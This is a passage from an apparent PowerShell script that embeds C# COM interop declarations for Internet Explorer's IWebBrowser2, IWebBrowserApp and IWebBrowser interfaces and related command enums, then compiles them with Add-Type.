        bool Visible { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x192)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x192)] set; }
        [DispId(0x193)]
        bool StatusBar { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x193)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x193)] set; }
        [DispId(0x194)]
        string StatusText { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x194)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x194)] set; }
        [DispId(0x195)]
        int ToolBar { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x195)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x195)] set; }
        [DispId(0x196)]
        bool MenuBar { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x196)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x196)] set; }
        [DispId(0x197)]
        bool FullScreen { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x197)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x197)] set; }
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(500)]
        void Navigate2([In, MarshalAs(UnmanagedType.Struct)] ref object URL, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Flags, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object TargetFrameName, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object PostData, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Headers);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x1f5)]
        OLECMDF QueryStatusWB([In] OLECMDID cmdID);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x1f6)]
        void ExecWB([In] OLECMDID cmdID, [In] OLECMDEXECOPT cmdexecopt, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object pvaIn, [In, Out, Optional, MarshalAs(UnmanagedType.Struct)] ref object pvaOut);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x1f7)]
        void ShowBrowserBar([In, MarshalAs(UnmanagedType.Struct)] ref object pvaClsid, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object pvarShow, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object pvarSize);
        [DispId(-525)]
        tagREADYSTATE ReadyState { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(-525), TypeLibFunc((short)4)] get; }
        [DispId(550)]
        bool Offline { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(550)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(550)] set; }
        [DispId(0x227)]
        bool Silent { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x227)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x227)] set; }
        [DispId(0x228)]
        bool RegisterAsBrowser { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x228)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x228)] set; }
        [DispId(0x229)]
        bool RegisterAsDropTarget { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x229)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x229)] set; }
        [DispId(0x22a)]
        bool TheaterMode { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x22a)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x22a)] set; }
        [DispId(0x22b)]
        bool AddressBar { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x22b)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x22b)] set; }
        [DispId(0x22c)]
        bool Resizable { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x22c)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x22c)] set; }
    }

    [ComImport, Guid("0002DF05-0000-0000-C000-000000000046"), TypeLibType((short)0x1050), DefaultMember("Name"), SuppressUnmanagedCodeSecurity]
    public interface IWebBrowserApp : IWebBrowser
    {
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(100)]
        void GoBack();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x65)]
        void GoForward();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x66)]
        void GoHome();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x67)]
        void GoSearch();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x68)]
        void Navigate([In, MarshalAs(UnmanagedType.BStr)] string URL, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Flags, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object TargetFrameName, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object PostData, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Headers);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(-550)]
        void Refresh();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x69)]
        void Refresh2([In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Level);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x6a)]
        void Stop();
        [DispId(200)]
        object Application { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(200)] get; }
        [DispId(0xc9)]
        object Parent { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xc9)] get; }
        [DispId(0xca)]
        object Container { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xca)] get; }
        [DispId(0xcb)]
        object Document { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcb)] get; }
        [DispId(0xcc)]
        bool TopLevelContainer { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcc)] get; }
        [DispId(0xcd)]
        string Type { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcd)] get; }
        [DispId(0xce)]
        int Left { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xce)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xce)] set; }
        [DispId(0xcf)]
        int Top { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcf)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcf)] set; }
        [DispId(0xd0)]
        int Width { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd0)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd0)] set; }
        [DispId(0xd1)]
        int Height { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd1)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd1)] set; }
        [DispId(210)]
        string LocationName { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(210)] get; }
        [DispId(0xd3)]
        string LocationURL { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd3)] get; }
        [DispId(0xd4)]
        bool Busy { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd4)] get; }
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(300)]
        void Quit();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x12d)]
        void ClientToWindow([In, Out] ref int pcx, [In, Out] ref int pcy);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x12e)]
        void PutProperty([In, MarshalAs(UnmanagedType.BStr)] string Property, [In, MarshalAs(UnmanagedType.Struct)] object vtValue);
        [return: MarshalAs(UnmanagedType.Struct)]
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x12f)]
        object GetProperty([In, MarshalAs(UnmanagedType.BStr)] string Property);
        [DispId(0)]
        string Name { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0)] get; }
        [DispId(-515)]
        int HWND { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(-515)] get; }
        [DispId(400)]
        string FullName { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(400)] get; }
        [DispId(0x191)]
        string Path { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x191)] get; }
        [DispId(0x192)]
        bool Visible { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x192)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x192)] set; }
        [DispId(0x193)]
        bool StatusBar { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x193)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x193)] set; }
        [DispId(0x194)]
        string StatusText { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x194)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x194)] set; }
        [DispId(0x195)]
        int ToolBar { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x195)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x195)] set; }
        [DispId(0x196)]
        bool MenuBar { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x196)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x196)] set; }
        [DispId(0x197)]
        bool FullScreen { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x197)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x197)] set; }
    }

    [ComImport, TypeLibType((short)0x1050), Guid("EAB22AC1-30C1-11CF-A7EB-0000C05BAE0B"), SuppressUnmanagedCodeSecurity]
    public interface IWebBrowser
    {
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(100)]
        void GoBack();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x65)]
        void GoForward();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x66)]
        void GoHome();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x67)]
        void GoSearch();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x68)]
        void Navigate([In, MarshalAs(UnmanagedType.BStr)] string URL, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Flags, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object TargetFrameName, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object PostData, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Headers);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(-550)]
        void Refresh();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x69)]
        void Refresh2([In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Level);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x6a)]
        void Stop();
        [DispId(200)]
        object Application { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(200)] get; }
        [DispId(0xc9)]
        object Parent { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xc9)] get; }
        [DispId(0xca)]
        object Container { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xca)] get; }
        [DispId(0xcb)]
        object Document { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcb)] get; }
        [DispId(0xcc)]
        bool TopLevelContainer { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcc)] get; }
        [DispId(0xcd)]
        string Type { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcd)] get; }
        [DispId(0xce)]
        int Left { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xce)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xce)] set; }
        [DispId(0xcf)]
        int Top { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcf)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcf)] set; }
        [DispId(0xd0)]
        int Width { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd0)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd0)] set; }
        [DispId(0xd1)]
        int Height { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd1)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd1)] set; }
        [DispId(210)]
        string LocationName { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(210)] get; }
        [DispId(0xd3)]
        string LocationURL { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd3)] get; }
        [DispId(0xd4)]
        bool Busy { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd4)] get; }
    }
    public enum tagREADYSTATE {READYSTATE_UNINITIALIZED = 0,READYSTATE_LOADING = 1,READYSTATE_LOADED = 2,READYSTATE_INTERACTIVE = 3,READYSTATE_COMPLETE = 4}
    public enum OLECMDID{OLECMDID_OPEN = 1,OLECMDID_NEW = 2,OLECMDID_SAVE = 3,OLECMDID_SAVEAS = 4,OLECMDID_SAVECOPYAS = 5,OLECMDID_PRINT = 6,OLECMDID_PRINTPREVIEW = 7,OLECMDID_PAGESETUP = 8,OLECMDID_SPELL = 9,OLECMDID_PROPERTIES = 10,OLECMDID_CUT = 11,OLECMDID_COPY = 12,OLECMDID_PASTE = 13,OLECMDID_PASTESPECIAL = 14,OLECMDID_UNDO = 15,OLECMDID_REDO = 16,OLECMDID_SELECTALL = 17,OLECMDID_CLEARSELECTION = 18,OLECMDID_ZOOM = 19,OLECMDID_GETZOOMRANGE = 20,OLECMDID_UPDATECOMMANDS = 21,OLECMDID_REFRESH = 22,OLECMDID_STOP = 23,OLECMDID_HIDETOOLBARS = 24,OLECMDID_SETPROGRESSMAX = 25,OLECMDID_SETPROGRESSPOS = 26,OLECMDID_SETPROGRESSTEXT = 27,OLECMDID_SETTITLE = 28,OLECMDID_SETDOWNLOADSTATE = 29,OLECMDID_STOPDOWNLOAD = 30,OLECMDID_ONTOOLBARACTIVATED = 31,OLECMDID_FIND = 32,OLECMDID_DELETE = 33,OLECMDID_HTTPEQUIV = 34,OLECMDID_HTTPEQUIV_DONE = 35,OLECMDID_ENABLE_INTERACTION = 36,OLECMDID_ONUNLOAD = 37,OLECMDID_PROPERTYBAG2 = 38,OLECMDID_PREREFRESH = 39,OLECMDID_SHOWSCRIPTERROR = 40,OLECMDID_SHOWMESSAGE = 41,OLECMDID_SHOWFIND = 42,OLECMDID_SHOWPAGESETUP = 43,OLECMDID_SHOWPRINT = 44,OLECMDID_CLOSE = 45,OLECMDID_ALLOWUILESSSAVEAS = 46,OLECMDID_DONTDOWNLOADCSS = 47,OLECMDID_UPDATEPAGESTATUS = 48,OLECMDID_PRINT2 = 49,OLECMDID_PRINTPREVIEW2 = 50,OLECMDID_SETPRINTTEMPLATE = 51,OLECMDID_GETPRINTTEMPLATE = 52,OLECMDID_PAGEACTIONBLOCKED = 55,OLECMDID_PAGEACTIONUIQUERY = 56,OLECMDID_FOCUSVIEWCONTROLS = 57,OLECMDID_FOCUSVIEWCONTROLSQUERY = 58,OLECMDID_SHOWPAGEACTIONMENU = 59,OLECMDID_OPTICAL_ZOOM = 63,OLECMDID_OPTICAL_GETZOOMRANGE = 64,    }
    public enum OLECMDEXECOPT { OLECMDEXECOPT_DODEFAULT = 0,OLECMDEXECOPT_PROMPTUSER = 1,OLECMDEXECOPT_DONTPROMPTUSER = 2,OLECMDEXECOPT_SHOWHELP = 3 }
    public enum OLECMDF{OLECMDF_SUPPORTED = 1,OLECMDF_ENABLED = 2,OLECMDF_LATCHED = 4,OLECMDF_NINCHED = 8,OLECMDF_INVISIBLE = 16,OLECMDF_DEFHIDEONCTXTMENU = 32}
}
"@
$asm = Add-Type -TypeDefinition $source -Language CSharpVersion3 -IgnoreWarnings -ReferencedAssemblies Microsoft.mshtml
   }
    Dispatch
}
